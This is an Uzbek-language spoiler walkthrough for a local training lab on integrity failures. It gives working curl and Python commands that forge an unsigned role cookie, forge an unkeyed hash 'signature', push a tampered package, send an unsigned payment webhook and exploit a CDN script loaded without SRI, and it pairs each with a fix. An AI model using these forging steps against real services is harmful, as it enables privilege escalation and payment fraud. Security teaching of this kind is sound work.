🌐 [English](./SOLUTION.md) · [Русский](./SOLUTION.ru.md) · **Oʻzbekcha**

# A08 — Yechim tahlili (spoylerlar)

Misollar: `http://127.0.0.1:8071` (vulnerable) ga `curl` va maʼlumotlarni kodlash uchun qisqa Python bir qatorlilari. Windows'da Git Bash yoki WSL qulayroq.

## 1-nuqson — cookie dagi foydalanuvchi holati imzosiz

Kirgandan keyin server `a08v_profile` cookie'sini beradi: bu shunchaki `base64url({"user":"alice","role":"user"})`. Server har bir soʻrovda rolni undan oʻqiydi.

```bash
FORGED=$(python3 -c "import base64,json;print(base64.urlsafe_b64encode(json.dumps({'user':'alice','role':'admin'}).encode()).decode().rstrip('='))")
curl -s -b "a08v_profile=$FORGED" http://127.0.0.1:8071/admin
# {"flag": "FLAG{a08_unsigned_profile_cookie}", "ok": true}
```

**Qoida:** mijozda saqlanadigan hamma narsani mijoz oʻzgartira oladi. Ishonchli holatni serverda saqlaymiz yoki imzolaymiz.

**Fix:** cookie server siri bilan HMAC-SHA256 yordamida imzolangan, rol esa tokendan umuman olinmaydi: u serverdagi saqlash joyidan oʻqiladi (`# FIX 1`).

> Deserializatsiya haqida: real ilovalarda xuddi shu narsa `pickle`, Java-serializatsiya, PHP dagi `unserialize()` va shunga oʻxshashlarda sodir boʻladi: u yerda maʼlumotlarni almashtirish kodning bajarilishiga olib kelishi mumkin. Laboratoriyaga bunday eksploitlar ataylab kiritilmagan: dars uchun maʼlumotlarni almashtirish yetarli. Qoida oʻsha-oʻsha: ishonchsiz maʼlumotlarni deserializatsiya qilmang va imzo bilan birga oddiy formatlardan (JSON) foydalaning.

## 2-nuqson — maxfiy kalitsiz «imzo»

`a08v_license` cookie'si = `base64url(json).sha256hex(json)`. Imzoga oʻxshaydi, ammo SHA-256 shunchaki xesh: uni istalgan kishi hisoblay oladi.

```bash
curl -s -c j.txt -X POST http://127.0.0.1:8071/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
PROFILE=$(grep a08v_profile j.txt | awk '{print $7}')
FORGED=$(python3 - <<'PY'
import base64, hashlib, json
data = json.dumps({"user":"alice","plan":"pro"}, separators=(",",":")).encode()
print(base64.urlsafe_b64encode(data).decode().rstrip("=") + "." + hashlib.sha256(data).hexdigest())
PY
)
curl -s -b "a08v_profile=$PROFILE; a08v_license=$FORGED" http://127.0.0.1:8071/pro
# {"flag": "FLAG{a08_unkeyed_hash_is_not_a_signature}", "ok": true}
```

**Qoida:** xesh tasodifiy buzilishdan himoyalaydi, ammo hujumchidan emas. Unga qarshi sirli MAC (HMAC) yoki raqamli imzo kerak.

**Fix:** `hmac.new(SECRET, data, sha256)` + `hmac.compare_digest`; litsenziya foydalanuvchiga bogʻlangan (`# FIX 2`).

## 3-nuqson — yaxlitligi tekshirilmaydigan yangilanish

Oyna «buzilgan»: hujumchi `theme-pack` paketida ortiqcha `payout_account` maydonini eʼlon qilgan:

```bash
curl -s -X POST http://127.0.0.1:8071/mirror/publish -H 'Content-Type: application/json' \
  -d '{"package":"theme-pack","version":"1.2","content":{"theme":"dark","payout_account":"ATTACKER-IBAN-6666"}}'
curl -s -X POST http://127.0.0.1:8071/system/run-update
curl -s http://127.0.0.1:8071/settings
# payout_account oʻzgargan; javobda FLAG{a08_update_without_integrity_check} bayrogʻi
```

Taʼminot zanjiriga hujumlar aynan shunday ishlaydi: mazmunni tekshirish oʻrniga manbaga ishonch («bu axir bizning oynamiz»).

**Fix** (`# FIX 3`): har bir paketning qotirilgan xeshi bor «lock-fayl», `compare_digest` orqali solishtirish, lock-faylda yoʻq paketni rad etish, shuningdek paket umuman oʻzgartira oladigan maydonlarning oq roʻyxati. Haqiqiy dunyoda xuddi shu tamoyil: `integrity` li `package-lock.json`, `pip install --require-hashes`, artefaktlarni imzolash (Sigstore/cosign), Docker obrazlarining qotirilgan dayjestlari.

## 4-nuqson — imzosiz webhook

```bash
curl -s -c j.txt -X POST http://127.0.0.1:8071/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
curl -s -X POST http://127.0.0.1:8071/webhook/payment -H 'Content-Type: application/json' \
  -d '{"order_id":1001,"status":"paid","amount":5000}'
curl -s -b j.txt http://127.0.0.1:8071/orders/1001
# status: paid, download_key: FLAG{a08_unsigned_webhook}
```

**Fix** (`# FIX 4`): provayder `timestamp.tana` ni umumiy sir bilan imzolaydi (`X-Signature: sha256=...`, `X-Timestamp`). Server imzoni, belgi yangiligini (±5 daqiqa), bu imzo hali ishlatilmaganini (replay) hamda buyurtma summasi va holati mos kelishini tekshiradi.

fixed ga toʻgʻri yuborish shunday koʻrinadi (siri bor haqiqiy provayder shunday qiladi):

```python
import hashlib, hmac, json, time, requests
secret = b"lab-demo-webhook-secret"
body = json.dumps({"order_id": 1001, "status": "paid", "amount": 5000}).encode()
ts = str(int(time.time()))
sig = "sha256=" + hmac.new(secret, ts.encode() + b"." + body, hashlib.sha256).hexdigest()
r = requests.post("http://127.0.0.1:8072/webhook/payment", data=body,
                  headers={"X-Timestamp": ts, "X-Signature": sig, "Content-Type": "application/json"})
print(r.status_code, r.text)   # 200; aynan shu soʻrovni takrorlash -> 409; tana oʻzgartirilsa -> 401
```

Hujumchi sirni bilmaydi, shuning uchun usiz yaroqli imzo yarata olmaydi.

## 5-nuqson — SRI siz uchinchi tomon skripti

1. `http://127.0.0.1:8071/donate` ni oching: qonuniy rekvizitlar `LAB-IBAN-0001-LEGIT` koʻrinadi.
2. `curl -X POST http://127.0.0.1:8071/cdn/compromise` ni bajaring va sahifani yangilang: endi u yerda `ATTACKER-IBAN-6666`. Sahifaning oʻzi oʻzgarmadi, ammo yuklanadigan skript oʻzgardi.

**Fix** (`# FIX 5`, sahifa `http://127.0.0.1:8072/donate`):

```html
<script src="/cdn/widget.js" integrity="sha384-..." crossorigin="anonymous"></script>
```

Brauzer olingan fayl xeshini `integrity` bilan solishtiradi va mos kelmasa, skriptni shunchaki bajarmaydi. Qadamlarni 8072 da takrorlang: `POST /cdn/compromise` dan keyin rekvizitlar «загрузка…» boʻlib qoladi, brauzer konsolida esa yaxlitlikni tekshirish xatosi paydo boʻladi. SRI CDN dagi faylning almashtirilishidan himoyalaydi, ammo oʻzingiz qotirgan zararli versiyadan emas, shuning uchun xeshlar tekshirilgan yigʻmadan olinadi.

## Xulosa
Beshta nuqsonning umumiy tomoni: server yoki brauzer maʼlumotlarga ularning **kelib chiqishiga qarab ishonadi** («bu axir bizning cookie / oynamiz / toʻlov provayderimiz / CDN imiz»), ularning haqiqiyligini **tekshirmaydi**. Tuzatish hamma joyda maʼnosi bir xil: imzo yoki qotirilgan xesh, hujumchida yoʻq sir, yangilikni tekshirish va hatto ishonchli maʼlumotlar nimani oʻzgartira olishini cheklash.
